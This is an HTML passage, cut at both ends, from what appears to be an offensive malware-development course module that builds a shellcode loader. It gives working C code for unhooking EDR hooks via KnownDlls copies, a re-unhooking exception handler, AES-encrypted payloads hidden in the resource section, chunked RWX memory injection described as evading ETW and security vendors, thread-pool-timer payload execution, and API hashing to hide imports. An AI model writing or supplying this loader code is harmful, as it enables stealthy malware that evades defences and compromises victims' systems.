	while (pNextEntry != pHeadEntry &amp;&amp; iModules &lt; 3) {

		// Getting the dll's name
		PLDR_DATA_TABLE_ENTRY           pLdrDataTblEntry        = 
(PLDR_DATA_TABLE_ENTRY)((PBYTE)pNextEntry - 
offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING                 pUnicodeDllName         = 
(PUNICODE_STRING)((PBYTE)&amp;pLdrDataTblEntry-&gt;FullDllName + 
sizeof(UNICODE_STRING));
		// Getting the dll's local base address &amp; load the unhooked 
version from \KnownDlls\ dir
		LPVOID				pKnownDllCopy           = 
MapDllFromKnownDllDir(pUnicodeDllName-&gt;Buffer),
						    pLocalDllCopy           = 
(LPVOID)(pLdrDataTblEntry-&gt;DllBase);

		SIZE_T				sTextSectionSize                = NULL;
		LPVOID				pLocalTxtSectionAddress         = NULL,
						    pKnownDllTxtSectionAddress      = NULL;
		DWORD				dwOldProtection                 = 0x00;


		// If both pointers are retrieved
		if (pKnownDllCopy &amp;&amp; pLocalDllCopy) {

			// Fetch the NT headers
			PIMAGE_NT_HEADERS		pLocalImgNtHdrs		    = 
(PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalDllCopy + 
((PIMAGE_DOS_HEADER)pLocalDllCopy)-&gt;e_lfanew);
			if (pLocalImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
				goto _CLEANUP;

			PIMAGE_SECTION_HEADER		pLocalImgSecHdr		= 
IMAGE_FIRST_SECTION(pLocalImgNtHdrs);

			// Search for the .text section in the local dll
			for (int i = 0; i &lt; 
pLocalImgNtHdrs-&gt;FileHeader.NumberOfSections; i++) {
				if (CRCHASH(pLocalImgSecHdr[i].Name) == text_CRC32) {

					g_sTextSectionSize            =	sTextSectionSize            = 
pLocalImgSecHdr[i].Misc.VirtualSize;
					g_pLocalTxtSectionAddress     =	pLocalTxtSectionAddress     = 
(LPVOID)((ULONG_PTR)pLocalDllCopy + pLocalImgSecHdr[i].VirtualAddress);
					g_pKnownDllTxtSectionAddress  =	pKnownDllTxtSectionAddress  = 
(LPVOID)((ULONG_PTR)pKnownDllCopy + pLocalImgSecHdr[i].VirtualAddress);
					break;
				}
			}

			// Check if all variables are retrieved
			if (!sTextSectionSize || !pLocalTxtSectionAddress || 
!pKnownDllTxtSectionAddress)
				goto _CLEANUP;

			// Change memory permissions to RW, to allow overwriting 
			SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
			if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pLocalTxtSectionAddress, &amp;sTextSectionSize, PAGE_READWRITE, 
&amp;dwOldProtection))) {
				goto _CLEANUP;
			}

			// Overwriting the hooked .text section with the fresh one
			memcpy(pLocalTxtSectionAddress, pKnownDllTxtSectionAddress, 
sTextSectionSize);

			// Reset the memory permissions to the original
			SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
			if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pLocalTxtSectionAddress, &amp;sTextSectionSize, dwOldProtection, 
&amp;dwOldProtection))) {
				goto _CLEANUP;
			}

		}

_CLEANUP:
		// Move to the next dll
		pNextEntry = pNextEntry-&gt;Flink;
		iModules++;
		// Unmap the \knowndlls\ dll if found mapped
		if (pKnownDllCopy) {
			SET_SYSCALL(g_Nt.NtUnmapViewOfSection);
			RunSyscall(NtCurrentProcess(), pKnownDllCopy);
		}
	}
}
</code></pre>
<h3>VectoredExceptionHandler Function</h3>
<p>Prior to invoking the <code>UnhookAllLoadedDlls</code> function, it's
 essential to initialize a Vectored Exception Handler (VEH). This 
initialization process has been covered several times throughout the 
course which utilizes the <code>AddVectoredExceptionHandler</code> WinAPI function.</p>
<p>Our custom VEH function itself is named <code>VectoredExceptionHandler</code>, and its functionality is outlined below:</p>
<ol>
<li>
<p>Initially, it checks if the exception code corresponds to <code>EXCEPTION_ACCESS_VIOLATION</code>. If so, it proceeds to validate the source of the exception. If the exception was triggered within the target DLL's <code>.text</code> section, it is considered a valid exception and is processed by the function. Otherwise, the function returns <code>EXCEPTION_CONTINUE_SEARCH</code>.</p>
</li>
<li>
<p>Following this, the VEH function makes a syscall to <code>NtProtectVirtualMemory</code>, which designates the target <code>.text</code> section as a <code>PAGE_EXECUTE_READWRITE</code> memory region.</p>
</li>
<li>
<p>Finally, the VEH function replaces the hooked <code>.text</code> section with an unhooked version.</p>
</li>
</ol>
<p>All of the steps mentioned above rely on the global variables initialized by the <code>UnhookAllLoadedDlls</code> function.</p>
<pre><code class="language-C">LONG WINAPI 
VectoredExceptionHandler(PEXCEPTION_POINTERS pExceptionInfo) 
{
	
	NTSTATUS		STATUS			= 0x00;
	DWORD			dwOldProtection 	= 0x00;

	if (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == 
EXCEPTION_ACCESS_VIOLATION &amp;&amp;
		pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &gt;= 
g_pLocalTxtSectionAddress &amp;&amp; 
		pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress &lt;= 
((ULONG_PTR)g_pLocalTxtSectionAddress + g_sTextSectionSize)) {

		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;g_pLocalTxtSectionAddress, &amp;g_sTextSectionSize, 
PAGE_EXECUTE_READWRITE, &amp;dwOldProtection))) {
			goto _FAILURE;
		}
		
		memcpy(g_pLocalTxtSectionAddress, g_pKnownDllTxtSectionAddress, 
g_sTextSectionSize);
		
		return EXCEPTION_CONTINUE_EXECUTION;
	}

_FAILURE:
	return EXCEPTION_CONTINUE_SEARCH;
}
</code></pre>
<h3>Custom AES Library</h3>
<p>Next up is the encryption phase where the loader will use the <a href="https://github.com/bitcoin-core/ctaes">ctaes</a> library for AES-256 encryption and decryption. To integrate this library into the loader, two additional files, specifically <a href="https://github.com/bitcoin-core/ctaes/blob/master/ctaes.c">ctaes.c</a> and <a href="https://github.com/bitcoin-core/ctaes/blob/master/ctaes.h">ctaes.h</a>, need to be included.</p>
<p>To use the ctaes library for AES256 encryption, the payload should be encrypted using the following functions:</p>
<ol>
<li>
<p><code>AES256_CBC_init</code> - Initialize a <code>AES256_CBC_ctx</code> structure, that will be used for the encryption or decryption of the payload.</p>
</li>
<li>
<p><code>AES256_CBC_encrypt</code> - Applies the AES256 algorithm to encrypt a specified plaintext buffer.</p>
</li>
</ol>
<p>On the other hand, to decrypt the payload, the loader should call the following:</p>
<ol>
<li>
<p><code>AES256_CBC_init</code> - Initialize a <code>AES256_CBC_ctx</code> structure, that will be used for the encryption or decryption of the payload.</p>
</li>
<li>
<p><code>AES256_CBC_decrypt</code> - Applies the AES256 algorithm to decrypt a specified ciphertext buffer.</p>
</li>
</ol>
<p>An example of calling these functions is found <a href="https://github.com/bitcoin-core/ctaes/blob/master/test.c#L160">here</a>, however, the loader will further enhance the <code>AES256_CBC_encrypt</code> and <code>AES256_CBC_decrypt</code> functions in the next section.</p>
<h4>Enhancing AES Functions</h4>
<p>The original implementation of the encrypt and decrypt functions is shown below.</p>
<pre><code class="language-C">void AES256_CBC_encrypt(AES256_CBC_ctx* ctx, size_t blocks, unsigned char* encrypted, const unsigned char* plain) {
    AESCBC_encrypt(ctx-&gt;ctx.rk, ctx-&gt;iv, 14, blocks, encrypted, plain);
}

void AES256_CBC_decrypt(AES256_CBC_ctx* ctx, size_t blocks, unsigned char* plain, const unsigned char *encrypted) {
    AESCBC_decrypt(ctx-&gt;ctx.rk, ctx-&gt;iv, 14, blocks, plain, encrypted);
}
</code></pre>
<p>However, the function the functions have been updated to be as follows:</p>
<pre><code class="language-C">boolean AES256_CBC_encrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* plain, IN size_t plainsize, OUT PBYTE* encrypted)
{
    if (plainsize % 16 != 0)
        return FALSE;
    size_t blocks = plainsize / 16;
    *encrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, plainsize);
    if (*encrypted != NULL)
        AESCBC_encrypt(ctx-&gt;ctx.rk, ctx-&gt;iv, 14, blocks, *encrypted, plain);
    else
        return FALSE;

    return TRUE;
}

boolean AES256_CBC_decrypt(IN AES256_CBC_ctx* ctx, IN const unsigned char* encrypted, IN size_t ciphersize, OUT PBYTE* plain)
{
    if (ciphersize % 16 != 0)
        return FALSE;
    size_t blocks = ciphersize / 16;
    *plain = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ciphersize);
    if (*plain != NULL)
        AESCBC_decrypt(ctx-&gt;ctx.rk, ctx-&gt;iv, 14, blocks, *plain, encrypted);
    else
        return FALSE;

    return TRUE;
}
</code></pre>
<h4>Payload Encryption</h4>
<p>To perform payload encryption, a new program has been developed called <code>PayloadEncrypter</code>. This program's primary function is to read a payload file from the disk, encrypt it, and then save it under a new name, <code>Payload.ctaes</code>. This encrypted payload, <code>Payload.ctaes</code>, becomes an integral part of the loader's project and is stored within its resource section.</p>
<p>It's important to note that the ctaes library lacks support for padding. Therefore, before invoking the <code>AES256_CBC_encrypt</code> function, <code>PayloadEncrypter</code> must manually add padding to ensure that the payload buffer's size is a multiple of 16 bytes, as required by the AES algorithm.</p>
<p>The code for <code>PayloadEncrypter</code> isn't entirely new, and a similar approach was used when working with the <a href="https://github.com/kokke/tiny-AES-c">Tiny-AES</a> library in the <em>Payload Encryption - AES Encryption</em>
 module. Consequently, this process is not extensively discussed in the 
module but is instead shared within the module's code. It's worth 
mentioning that <code>PayloadEncrypter</code> stores the AES key and Initialization Vector (IV) after the payload's ciphertext bytes in the generated <code>Payload.ctaes</code> file, as illustrated in the following images.</p>
<img width="1000" alt="image" style="margin:auto" src="23_files/dllldr-465958673-ef1605bb-0ba9-4ab6-bb09-172b133234c7.png">
<img width="800" alt="image" style="margin:auto" src="23_files/dllldr-565958685-e7b8bceb-a8f9-49e4-8755-54579325c39c.png">
<h4>Payload Decryption</h4>
<p>From the loader's perspective, the payload is stored in the <code>.rsrc</code> section. Therefore, it needs to perform the following two steps:</p>
<p>First, retrieve the payload from the resource section and copy it to a local buffer. This task is accomplished using the <code>GetResourcePayload</code> function, which is outlined below. <code>GetResourcePayload</code> internally calls <a href="https://github.com/NUL0x4C/ManualRsrcDataFetching/blob/main/ManualResourceDataFetching/main.c#L8">GetResourceData</a> to locate the payload file within the resource section, without utilizing the <code>FindResource</code>, <code>LoadResource</code>, <code>LockResource</code>, or <code>SizeofResource</code> WinAPIs. The <code>GetResourcePayload</code> function requires the following parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the module from which the resource section payload should be retrieved.</p>
</li>
<li>
<p><code>wResourceId</code> - The resource ID associated with the payload, which was assigned during the creation of the resource section.</p>
</li>
<li>
<p><code>ppResourceBuffer</code> - A pointer to a <code>PBYTE</code> variable that will receive a pointer to the first byte of the resource payload.</p>
</li>
<li>
<p><code>pdwResourceSize</code> - A pointer to a <code>DWORD</code> variable that will capture the size of the resource payload.</p>
</li>
</ul>
<pre><code class="language-C">BOOL GetResourceData(IN HMODULE hModule, 
IN WORD ResourceId, OUT PVOID* ppResourceRawData, OUT PDWORD 
psResourceDataSize) {

	CHAR*                   pBaseAddr          = (CHAR*)hModule;
	PIMAGE_DOS_HEADER       pImgDosHdr         = 
(PIMAGE_DOS_HEADER)pBaseAddr;
	PIMAGE_NT_HEADERS       pImgNTHdr          = 
(PIMAGE_NT_HEADERS)(pBaseAddr + pImgDosHdr-&gt;e_lfanew);
	PIMAGE_OPTIONAL_HEADER  pImgOptionalHdr    = 
(PIMAGE_OPTIONAL_HEADER)&amp;pImgNTHdr-&gt;OptionalHeader;
	PIMAGE_DATA_DIRECTORY   pDataDir           = 
(PIMAGE_DATA_DIRECTORY)&amp;pImgOptionalHdr-
&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE];

	PIMAGE_RESOURCE_DIRECTORY               pResourceDir    = NULL, 
pResourceDir2    = NULL, pResourceDir3   = NULL;
	PIMAGE_RESOURCE_DIRECTORY_ENTRY         pResourceEntry  = NULL, 
pResourceEntry2  = NULL, pResourceEntry3 = NULL;
	PIMAGE_RESOURCE_DATA_ENTRY              pResource	= NULL;


	pResourceDir	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress);
	pResourceEntry	= (IMAGE_RESOURCE_DIRECTORY_ENTRY*)(pResourceDir + 1);

	for (DWORD i = 0; i &lt; (pResourceDir-&gt;NumberOfNamedEntries + 
pResourceDir-&gt;NumberOfIdEntries); i++) {

		if (pResourceEntry[i].DataIsDirectory == 0)
			break;

		pResourceDir2	= (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry[i].OffsetToDirectory &amp;
 0x7FFFFFFF));
		pResourceEntry2 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir2 + 
1);

		if (pResourceEntry2-&gt;DataIsDirectory == 1 &amp;&amp; 
pResourceEntry2-&gt;Id == ResourceId) {

			pResourceDir3   = (PIMAGE_RESOURCE_DIRECTORY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry2-&gt;OffsetToDirectory 
&amp; 0x7FFFFFFF));
			pResourceEntry3 = (PIMAGE_RESOURCE_DIRECTORY_ENTRY)(pResourceDir3 + 
1);
			pResource       = (PIMAGE_RESOURCE_DATA_ENTRY)(pBaseAddr + 
pDataDir-&gt;VirtualAddress + (pResourceEntry3-&gt;OffsetToData &amp; 
0x7FFFFFFF));

			*ppResourceRawData	= (PVOID)(pBaseAddr + 
(pResource-&gt;OffsetToData));
			*psResourceDataSize 	= pResource-&gt;Size;

			break;
		}

	}

	if (*ppResourceRawData != NULL &amp;&amp; *psResourceDataSize != NULL)
		return TRUE;

	return FALSE;
}


BOOL GetResourcePayload(IN HMODULE hModule, IN WORD wResourceId, OUT 
PBYTE* ppResourceBuffer, OUT PDWORD pdwResourceSize) {
	
	PBYTE	pTmpResourceBuffer	= NULL;

	if (!GetResourceData(hModule, wResourceId, &amp;pTmpResourceBuffer, 
pdwResourceSize))
		return FALSE;
	*ppResourceBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 
*pdwResourceSize);
	memcpy(*ppResourceBuffer, pTmpResourceBuffer, *pdwResourceSize);
	return TRUE;
}
</code></pre>
<p>Next, it retrieves the AES key and IV from the payload file and proceeds to invoke the <code>AES256_CBC_decrypt</code> function. This operation is carried out using the <code>FetchAesConfAndDecrypt</code> function, as demonstrated below. <code>FetchAesConfAndDecrypt</code> requires the following parameters:</p>
<ul>
<li>
<p><code>pPayloadBuffer</code> - A pointer to the ciphertext payload.</p>
</li>
<li>
<p><code>sPayloadSize</code> - A pointer to a <code>SIZE_T</code> 
variable that stores the size of the ciphertext payload. After 
decryption, this variable will be updated to reflect the size of the 
plaintext payload.</p>
</li>
<li>
<p><code>ppDecryptedPayload</code> - A pointer to a <code>PBYTE</code> variable that will store the base address of the plaintext payload.</p>
</li>
</ul>
<pre><code class="language-C">#define	KEY_SIZE	                32       
    
#define	IV_SIZE		                16           
#define	SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) &amp; (~4095) )

BOOL FetchAesConfAndDecrypt(IN PBYTE pPayloadBuffer, IN OUT SIZE_T* 
sPayloadSize, OUT PBYTE* ppDecryptedPayload) {
	
	BOOL			bResult				= FALSE;
	AES256_CBC_ctx	CtAesCtx			= { 0 };
	BYTE			pAesKey	[KEY_SIZE]	= { 0 };
	BYTE			pAesIv	[IV_SIZE]	= { 0 };
	ULONG_PTR		uAesKeyPtr			= NULL,
					uAesIvPtr			= NULL;

	uAesKeyPtr	= ((pPayloadBuffer + *sPayloadSize) - (KEY_SIZE + IV_SIZE));
	uAesIvPtr	= ((pPayloadBuffer + *sPayloadSize) - IV_SIZE);

	Memcpy(pAesKey, uAesKeyPtr, KEY_SIZE);
	Memcpy(pAesIv, uAesIvPtr, IV_SIZE);

	// Updating the payload size
	*sPayloadSize = *sPayloadSize - (KEY_SIZE + IV_SIZE);
	
	// Decrypting
	AES256_CBC_init(&amp;CtAesCtx, pAesKey, pAesIv);
	if (!AES256_CBC_decrypt(&amp;CtAesCtx, pPayloadBuffer, *sPayloadSize, 
ppDecryptedPayload))
		goto _FUNC_CLEANUP;

	// "ppDecryptedPayload" is resized to be of size multiple of 4096
    *ppDecryptedPayload = HeapReAlloc(GetProcessHeap(), 
HEAP_ZERO_MEMORY, *ppDecryptedPayload, 
SET_TO_MULTIPLE_OF_4096(*sPayloadSize));
    if (*ppDecryptedPayload == NULL) 
        goto _FUNC_CLEANUP;

	bResult = TRUE;

_FUNC_CLEANUP:
	HeapFree(GetProcessHeap(), 0x00, pPayloadBuffer);	// Free allocated 
heap in 'GetResourcePayload' function
	return bResult;
}

</code></pre>
<h3>Payload Injection By Chunking</h3>
<p>The loader will implement payload injection by chunking which still relies on the same standard syscalls (<code>NtAllocateVirtualMemory</code> and <code>NtProtectVirtualMemory</code>) but these syscalls are executed multiple times using a method known as <em>chunking</em>.
 Chunking involves grouping various pieces of information into a single,
 more cohesive dataset. In this module, chunking will be used to inject 
the payload into memory. This is achieved by allocating small chunks of 
memory successively until the combined buffer size is sufficient to 
accommodate the entire payload. The same logic is applied to modify 
memory permissions to allow execution after allocation. Injecting the 
payload in this manner offers several advantages:</p>
<ul>
<li>
<p>Some security vendors tend to filter out small allocations, 
particularly from the perspective of ETW. This is because small 
allocations are quite common on a system, making it challenging to 
monitor every single one. As a result, allocating memory in small 
regions at a time may potentially be categorized as a non-critical 
event, although still detectable.</p>
</li>
<li>
<p>By having the loader make multiple calls to <code>NtAllocateVirtualMemory</code> and <code>NtProtectVirtualMemory</code>,
 it can disrupt the typical injection pattern (allocate - modify 
permissions - execute) often scrutinized by security vendors seeking 
malicious activity.</p>
</li>
</ul>
<p>It's important to note that while chunking is a valuable technique to
 evade injection-based detections, it is not a foolproof solution.</p>
<p>The image below illustrates how the loader allocates and adjusts the 
memory permissions of the memory region intended for writing the 
payload. Notice the <code>READ_ONLY</code> memory page that is intentionally left behind.</p>
<img width="1250" alt="image" style="margin:auto" src="23_files/dllldr-666213472-99b128ae-460b-47bf-af75-fdc08e35c9e7.png">
<h4>Payload Injection Steps</h4>
<p>The injection process will go through the following series of steps:</p>
<ol>
<li>
<p>The payload size is adjusted to become a multiple of a single page size, which is 4096 bytes.</p>
</li>
<li>
<p><code>NtAllocateVirtualMemory</code> is invoked to <strong>reserve</strong> a memory region. This reserved memory region is designed to accommodate the payload along with an additional <code>READ_ONLY</code> memory page, intentionally left behind for the remainder of the injection procedure. This particular <code>NtAllocateVirtualMemory</code>
 call serves the purpose of reserving memory and cannot be carried out 
in chunks. This is because there is a risk that the next address to be 
reserved (on the subsequent memory page) might already be allocated for 
another task. If you're interested in further details, <em>Module 6: Windows Memory Management</em> dives into the concepts of reserved vs. committed memory.</p>
</li>
<li>
<p>The base address of the allocation is incremented by 4096 (which corresponds to the page size) to bypass the <code>READ_ONLY</code> memory page.</p>
</li>
<li>
<p>A for-loop is initiated, with iterations equal to (payload size/page size). During each iteration, <code>NtAllocateVirtualMemory</code> is called once more to <strong>commit</strong> the memory page that was previously reserved. This committed memory page is configured as a <code>PAGE_READWRITE</code>
 memory region. After each iteration, the base address is further 
incremented by 4096 (page size) to point to the subsequent memory page 
awaiting commitment.</p>
</li>
<li>
<p>A similar for-loop is used to invoke <code>NtProtectVirtualMemory</code>, which updates memory permissions to <code>PAGE_EXECUTE_READWRITE</code>. This loop mirrors the previous step in terms of iteration count.</p>
</li>
<li>
<p>Finally, the payload is copied over to the newly allocated RWX memory. This is accomplished through a for-loop that uses <code>memcpy</code> for a total of (payload size/page size) iterations.</p>
</li>
</ol>
<h4>InjectEncryptedPayload Function</h4>
<p>The <code>InjectEncryptedPayload</code> function performs the steps explained in the previous section along with decrypting the payload via the <code>FetchAesConfAndDecrypt</code> function. Moreover, <code>InjectEncryptedPayload</code> returns <code>TRUE</code> if the payload is successfully injected. The function also requires the following parameters:</p>
<ul>
<li>
<p><code>pPayloadBuffer</code> - The base address of the ciphertext payload (returned by <code>GetResourcePayload</code>).</p>
</li>
<li>
<p><code>sPayloadSize</code> - The size of the ciphertext payload (returned by <code>GetResourcePayload</code>).</p>
</li>
<li>
<p><code>pInjectedPayload</code> - A pointer to a <code>PBYTE</code> variable that will receive the base address of the injected plaintext payload.</p>
</li>
</ul>
<pre><code class="language-C">#define		PAGE_SIZE			4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) &amp; (~4095) )


BOOL InjectEncryptedPayload(IN PBYTE pPayloadBuffer, IN SIZE_T 
sPayloadSize, OUT PBYTE* pInjectedPayload) {

	// We decrypt the payload to work with the new payload size 
	PBYTE		pDecryptedPayload	= NULL;

	if (!FetchAesConfAndDecrypt(pPayloadBuffer, &amp;sPayloadSize, 
&amp;pDecryptedPayload)) {
		return FALSE;
	}

	NTSTATUS	STATUS			    = 0x00;
	SIZE_T		sNewPayloadSize		= SET_TO_MULTIPLE_OF_4096(sPayloadSize),	// 
rounded up payload size
			    sChunkSize		    = PAGE_SIZE;
	DWORD		ii			        = sNewPayloadSize / PAGE_SIZE,			// number of 
iterations needed 
			    dwOldPermissions	    = 0x00;
	PVOID		pAddress		    = NULL,
			    pTmpAddress		    = NULL;
	PBYTE		pTmpPayload		    = NULL;

	// If not initialized
	if (!g_Nt.bInit)
		return FALSE;

//---------------------------------------------------------------------------------------------------------------------------------------------


	// ALLOCATE - COMMIT + RW
	// This can't be allocated in chunks because there is a risk that the 
next address to reserve is already reserved for another task
	// This will lead NtAllocateVirtualMemory to return 
'STATUS_CONFLICTING_ADDRESSES'.
	
	// Adding an additional page.
	// This page will remain RO and Reserved
	sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;

	SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
	if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), &amp;pAddress, 
0, &amp;sNewPayloadSize, MEM_RESERVE, PAGE_READONLY))) {
		return FALSE;
	}

	// Fixing up the base address and size to leave an RO page behind
	sNewPayloadSize = sNewPayloadSize - PAGE_SIZE;
	pAddress        = (PVOID)((ULONG_PTR)pAddress + PAGE_SIZE);


//---------------------------------------------------------------------------------------------------------------------------------------------


	// Starting from the base address 
	pTmpAddress = pAddress;

	// ALLOCATE - COMMIT + RW
	for (DWORD i = 0; i &lt; ii; i++) {

		SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpAddress, 0, &amp;sChunkSize, MEM_COMMIT, PAGE_READWRITE))) {
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

//---------------------------------------------------------------------------------------------------------------------------------------------


	// Starting from the base address 
	pTmpAddress = pAddress;

	// RWX
	for (DWORD i = 0; i &lt; ii; i++) {
		SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
		if (!NT_SUCCESS(STATUS = RunSyscall(NtCurrentProcess(), 
&amp;pTmpAddress, &amp;sChunkSize, PAGE_EXECUTE_READWRITE, 
&amp;dwOldPermissions))) {
			return FALSE;
		}

		pTmpAddress = (PVOID)((ULONG_PTR)pTmpAddress + sChunkSize);
	}

//---------------------------------------------------------------------------------------------------------------------------------------------


	// Starting from the base address 
	pTmpAddress = pAddress;
	pTmpPayload = pDecryptedPayload;

	// WRITE
	for (DWORD i = 0; i &lt; ii; i++) {

		memcpy(pTmpAddress, pTmpPayload, PAGE_SIZE);

		pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
		pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
	}

	*pInjectedPayload = pAddress;
	return TRUE;
}
</code></pre>
<h3>Executing Payload</h3>
<p>Following a successful call to the <code>InjectEncryptedPayload</code>
 function, the subsequent step involves executing the injected payload. 
Execution of the payload is achieved through the use of the <a href="https://learn.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-setthreadpooltimer">SetThreadpoolTimer</a> and <a href="https://learn.microsoft.com/en-us/windows/win32/api/threadpoolapiset/nf-threadpoolapiset-createthreadpooltimer">CreateThreadpoolTimer</a> WinAPI functions.</p>
<p>The <code>CreateThreadpoolTimer</code> function is used to execute 
the payload as a callback function once a timer object has elapsed. The 
timer object is configured by the <code>SetThreadpoolTimer</code> 
function and expires after a specified period of time, for instance, 10 
seconds, as defined by the function. You can find an example of using 
these WinAPIs provided by Microsoft <a href="https://learn.microsoft.com/en-us/windows/win32/procthread/using-the-thread-pool-functions">here</a>.</p>
<p>The following <code>ExecutePayload</code> function leverages the <code>CreateThreadpoolTimer</code> and <code>SetThreadpoolTimer</code> WinAPIs to execute the payload. It accepts a single parameter, <code>pInjectedPayload</code>, representing the address of the injected payload returned by the <code>InjectEncryptedPayload</code> function.</p>
<pre><code class="language-C">#define PAYLOAD_EXEC_DELAY                  0x0A            // 10 Seconds delay before executing the payload

VOID ExecutePayload(IN PVOID pInjectedPayload) {

	TP_CALLBACK_ENVIRON     tpCallbackEnv   = { 0 };
	FILETIME                FileDueTime     = { 0 };
	ULARGE_INTEGER          ulDueTime       = { 0 };
	PTP_TIMER               ptpTimer        = NULL;

	if (!pInjectedPayload)
		return;

	InitializeThreadpoolEnvironment(&amp;tpCallbackEnv);

	if (!(ptpTimer = CreateThreadpoolTimer((PTP_TIMER_CALLBACK)pInjectedPayload, NULL, &amp;tpCallbackEnv)))
		return;

	// Set the timer to fire in PAYLOAD_EXEC_DELAY seconds.
	ulDueTime.QuadPart              = (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
	FileDueTime.dwHighDateTime      = ulDueTime.HighPart;
	FileDueTime.dwLowDateTime       = ulDueTime.LowPart;

	SetThreadpoolTimer(ptpTimer, &amp;FileDueTime, 0x00, 0x00);

	WaitForSingleObject((HANDLE)-1, INFINITE);
}
</code></pre>
<h3>API Hashing</h3>
<p>The next objective of our loader is to obfuscate the IAT using API hashing. This is achieved through the <code>GetModuleHandleH</code> and <code>GetProcAddressH</code> functions, which replace <code>GetModuleHandleA</code> and <code>GetProcAddress</code>, respectively. Both of these functions were introduced earlier in the course and employ the CRC string hashing algorithm.</p>
<h4>GetModuleHandleH Function</h4>
<p>The <code>GetModuleHandleH</code> function, as presented below, takes a single parameter, <code>uModuleHash</code>, representing the CRC hash value of the <strong>lowercase ASCII</strong> DLL name. When called, <code>GetModuleHandleH</code> will return the base address of the specified DLL if it is found. Furthermore, if <code>GetModuleHandleH</code>
 is invoked without specifying a hash value, it will return the base 
address of the local executable image. This behavior is analogous to the
 original <code>GetModuleHandle</code> WinAPI.</p>
<pre><code class="language-C">HMODULE GetModuleHandleH(IN UINT32 uModuleHash) {


	PPEB                    pPeb             = NULL;
	PPEB_LDR_DATA           pLdr             = NULL;
	PLDR_DATA_TABLE_ENTRY   pDte             = NULL;

	pPeb    = (PPEB)__readgsqword(0x60);
	pLdr    = (PPEB_LDR_DATA)(pPeb-&gt;LoaderData);
	pDte    = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);

	// Return the handle of the local .exe image
	if (!uModuleHash)
		return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);

	while (pDte) {

		if (pDte-&gt;FullDllName.Buffer &amp;&amp; pDte-&gt;FullDllName.Length &lt; MAX_PATH) {

			CHAR    cLDllName    [MAX_PATH]	  = { 0 };
			DWORD   x                          = 0x00;

			while (pDte-&gt;FullDllName.Buffer[x]) {

				CHAR	wC	= pDte-&gt;FullDllName.Buffer[x];

				// Convert to lowercase
				if (wC &gt;= 'A' &amp;&amp; wC &lt;= 'Z')
					cLDllName[x] = wC - 'A' + 'a';
				// Copy other characters (numbers, special characters ...)
				else
					cLDllName[x] = wC;

				x++;
			}

			cLDllName[x] = '\0';
			
			if (CRCHASH(pDte-&gt;FullDllName.Buffer) == uModuleHash || CRCHASH(cLDllName) == uModuleHash) 
				return (HMODULE)(pDte-&gt;InInitializationOrderLinks.Flink);
		}

		// Move to the next node in the linked list
		pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
	} 

	return NULL;
}
</code></pre>
<h4>GetProcAddressH Function</h4>
<p>The <code>GetProcAddressH</code> function, shown below, requires two parameters:</p>
<ul>
<li>
<p><code>hModule</code> - A handle to the DLL module that holds the address of the desired WinAPI.</p>
</li>
<li>
<p><code>uApiHash</code> - The CRC hash value corresponding to the WinAPI's name.</p>
</li>
</ul>
<p>This <code>GetProcAddressH</code> function contains forwarded functions support which was discussed in the <em>Forwarded Functions</em> challenge.</p>
<pre><code class="language-C">FARPROC GetProcAddressH(IN HMODULE 
hModule, IN UINT32 uApiHash) {

	PBYTE                           pBase                     = 
(PBYTE)hModule;
	PIMAGE_NT_HEADERS               pImgNtHdrs                = NULL;
	PIMAGE_EXPORT_DIRECTORY         pImgExportDir             = NULL;
	PDWORD                          pdwFunctionNameArray      = NULL;
	PDWORD                          pdwFunctionAddressArray   = NULL;
	PWORD                           pwFunctionOrdinalArray    = NULL;
	DWORD                           dwImgExportDirSize        = 0x00;

	if (!hModule || !uApiHash)
		return NULL;

	pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + 
((PIMAGE_DOS_HEADER)pBase)-&gt;e_lfanew);
	if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	pImgExportDir           = (PIMAGE_EXPORT_DIRECTORY)(pBase + 
pImgNtHdrs-
